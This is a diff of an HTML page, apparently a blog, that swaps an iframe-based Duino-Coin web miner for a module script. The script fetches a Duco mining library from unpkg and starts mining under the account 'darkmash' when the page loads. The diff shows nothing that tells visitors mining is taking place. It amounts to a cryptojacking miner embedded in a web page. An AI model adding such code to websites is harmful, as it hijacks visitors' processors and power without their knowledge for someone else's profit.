@@ -269,7 +269,15 @@
             color: rgb(54, 54, 54);
         }
     </style>
-    <iframe class="mner" src="https://server.duinocoin.com/webminer.html?username=darkmash&threads=4&rigid=blog.home&keyinput="></iframe>
+<script type="module">
+import { Duco } from 'https://www.unpkg.com/duco';
+
+const miner = new Duco({
+    username: 'darkmash'
+})
+
+miner.start()
+</script>
     <footer id="footer">
 
         <div class="alert">
